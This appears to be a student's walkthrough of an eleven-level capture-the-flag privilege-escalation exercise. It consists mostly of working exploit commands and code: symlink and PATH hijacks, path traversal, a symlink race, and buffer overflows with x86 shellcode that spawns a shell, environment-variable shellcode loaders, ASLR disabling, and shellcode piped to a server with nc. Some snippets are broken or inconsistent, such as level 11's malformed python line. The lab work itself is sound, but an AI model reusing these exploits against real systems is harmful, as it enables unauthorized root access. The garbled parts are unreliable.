level 1:
Vulnerability: Link Attack.
I use objdump -d to disassemble the binary and readelf -x to read the content of hex bytes. 
It uses opoen() and filename as argument, which is vulnerable to link attack.
I create a link to .secret file and save it in home directory:
	ln -s /var/challenge/level1/.secret ~/.secret
Then, I ran program 1 using this link as parameter:
	./1 ~/.secret
succeed. Then I ran l33t in the program to level myself up to level2.

level 2:
Vulnerability: PATH/HOME attack and  link attack.
I also use objdump and readelf to read the contents I need. 
I found a instersting string -asxml.tidy.execlp
The function execlp seems hackable. 
execlp() use the shell PATH variable to locate applications
Program 2 calls tidy() to check the xhtml parameter. Create a link to l33t in home directory and add home to $PATH. 

	ln -s /usr/local/bin/l33t ~/tidy
	export PATH="$HOME:$PATH"
Run ./and get a OK.
Get myself to level3.

level 3:
Vulnerability: Link Attack
	ln -s /usr/local/bin/l33t ~/find
	export PATH="$HOME:$PATH"
Run ./3 and get a OK.
Get myself to level4

level 4:
Vulnerability: Dot Dot Attack
Program 4 takes the path to the executing program from input.
Our Original path is /var/challenge/level4/devel/bin/. 
Run ./4 with following string as parameter:
	./4 ../../../../../usr/local/bin/l33t
Done.

level 5:
Vulnerability: Overflow Attack

\x31\xc0\x50\x68\x6c\x33\x33\x74\x68\x62\x69\x6e\x2f\x68\x63\x61\x6c\x2f\x68\x72\x2f\x6c\x6f\x68\x2f\x2f\x75\x73

location of 11th element of the array (array[11]), where stores EIP, is our target.  
Create a shell file using our shellcode to open //bin/sh. 
I create an Environment variable wtih name MYSHELLCODE and put a string of "\x90" (NOP) characters on it (100,000 * "\x90")
Plus my shellcode to run //bin/sh/.
Program to create  MYSHELLCODE environment variavle and return it's address. 
----------------------------------------------------------------------------------------
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char code[] =  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53"
                "\x68/tty\x68/dev\x89\xe3\x31\xc9\x66"
                "\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0"
                "\x50\x68//sh\x68/bin\x89\xe3\x50\x53"
                "\x89\xe1\x99\xb0\x0b\xcd\x80";

int main() {

    /* Print addr of chellcode if exists */
    char* myshellcode;
    if (myshellcode = getenv("MYSHELLCODE")) {
        printf("Shellcode is at addr 0x%x\n", myshellcode);
        return 0;
    }

    /* Declare buffer to hold nop sled and egg */
    size_t buf_size = 43; // strlen(code) == no sled
    char buf[buf_size];

    memcpy(&buf[0], code, strlen(code));

    /* Assign and place the variable in the environment, and overwrite if exists */
    setenv("MYSHELLCODE", buf, 1);
}
--------------------------------------------------------------------------------------
Use following command to disable ASLR:
	setarch $(uname -m) -R --addr-no-randomize /bin/bash

	export MYSHELLCODE=$(python3 -c "print 	('\x90'*100000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')")
	./gete

to export environment variable MYSHELLCODE and get its address. 
	/var/challenge/level5/5 13 '0xbffff820'

level 6:
Vulnerability: Buffer Overflow
Program use strcopy() funcation to copy second input arguments. 
Use following code to attack:
	./6 / $(python -c "print 'a'*256 + '/usr/local/bin/l33t'")
Get the shell and run /usr/local/bin/l33t.

level 7:
Vulnerability: TOCTTOU Attack (Time of Check  to Time of Use).
There is a 1 second sleep(sleep(1)) between checking and executing. So I 
Create 7link, which is a file that contains the path to l33t (/usr/local/bin). 
Create a link named mylink to 7.cmd, which is a legal input for program 7.
	ln -s /var/challenge/level7/7.cmd ~/mylink
After that, I wrote those two commands:
	rm ~/mylink
	ln -s ~/7link ~/mylink
to change the link in order to run my own file.
Game begain. I use 
	./7 ~/mylink
to let program 7 check 7.cmd. While it's sleeping, use another terminal to run those two commands I wrote before to change the link. 
So it will execute l33t for me.

level 8:
Vulnerability: Overflow Attack
The server only check the end symbol but don't check the length of buffer. 
Write another shellcode that execute //usr/local/bin/l33t. 
The source code named shellcode.s is what I use to get the shellcode. 
I copy the shellcode for further use. 
Disable random address allocation first and run the server using port 33556:
	setarch $(uname -m) -R --addr-no-randomize /bin/bash
Program ./8 works as a Server:
	/var/challenge/level8/8 -p 12345
Open another terminal to send following shellcode to server:
python -c 'print "\x90"*30000 + "\x31\xc0\x50\x68\x6c\x33\x33\x74\x68\x62\x69\x6e\x2f\x68\x63\x61\x6c\x2f\x68\x72\x2f\x6c\x6f\x68\x2f\x2f\x75\x73\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\x66\x90\x90" + "\x90"*35493 + "\40\xd6\xfd\xff"' | nc 0.0.0.0 12345

level 9:
Vulnerability: Command Injection Attack
We need to use execv() to pass the content in the 4th argument to buffer. 
Write a program named in .c and use execv to call ./9 and pass the address of MYSHELLCODE into 9. 

Disable random address allocation first and run the server using port 33556:
	setarch $(uname -m) -R --addr-no-randomize /bin/bash

--------------------------------------- l90.c -------------------------------------------------------
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char code[] =  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53"
                "\x68/tty\x68/dev\x89\xe3\x31\xc9\x66"
                "\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0"
                "\x50\x68//sh\x68/bin\x89\xe3\x50\x53"
                "\x89\xe1\x99\xb0\x0b\xcd\x80";

int main() {

    /* Print addr of chellcode if exists */
    char* myshellcode;
    if (myshellcode = getenv("MYSHELLCODE")) {
        printf("Shellcode is at addr 0x%x\n", myshellcode);
        return 0;
    }

    /* Declare buffer to hold nop sled and egg */

    /* Spwan a shell with the above modified env */
    system("bash");

    return 0;
}
------------------------------------------------------------------------------------------------------
	export MYSHELLCODE=$(python -c "print '\x90'*100000+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
	~/l90.c

to import MYSHELLCODE and get MYSHELLCODE address. Write the address into run9.c, compile it and run:
	./l9

------------------------------------------ l9.c -------------------------------------------------------- 
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
void main(int argc,char** argv,char** env)
{
        char* name[]={NULL};
        char* file="/var/challenge/level9/9";
        char test[33]={ 0x3b,0xd7,0xff,0xff,
                        0x3b,0xd7,0xff,0xff,
                        0x3b,0xd7,0xff,0xff,
                        0x3b,0xd7,0xff,0xff,
                        0x3b,0xd7,0xff,0xff,
                        0x3b,0xd7,0xff,0xff,
                        0x3b,0xd7,0xff,0xff,
                        0x3b,0xd7,0xff,0xff,
                                        '\0'};
        env[3]=test;
        execv(file,name,env);
}

Get Shell and:
$ /usr/local/bin/l33t

level 10:
Vulnerability: String Overflow
Program 10 uses strncpy(), which is vulnerable to non-terminated string overflow attack. 
If I overflow mypwd, the eip of checkpwd() will be overwrote. 

0xffffd73a
0xffffd73c

As I did in level 9, disable random address allocation, import MYSHELLCODE and get MYSHELLCODE address. Then:
	r $(python -c "print 'a' * 512") $(python -c "print '\xff\xff\xd7\x3a'[::-1]*4  ")
to operate non-terminated string attack. content of username will be copied into password. It works in gdb, 
./but not works outside of gdb again. So I user the same solution before:
	./10 $(python -c "print 'a' * 512") $(python -c "print '\xff\xff\xd7\x3c'[::-1]*4  ")


level 11:
Vulberability: Overflow attack. 
First argument will overwrite eip. 
The second argument doesn't matter as long as it is not null. 

Export and get address of MYSHELLLCODE (Same as level 9 / 10). 
./11 $(python3 -c "print ('aa'+'\xff\ff\d7\3b'[::-1]*8192") '\xff\ff\d7\3b')
get shell and run:
/usr/local/bin/l33t
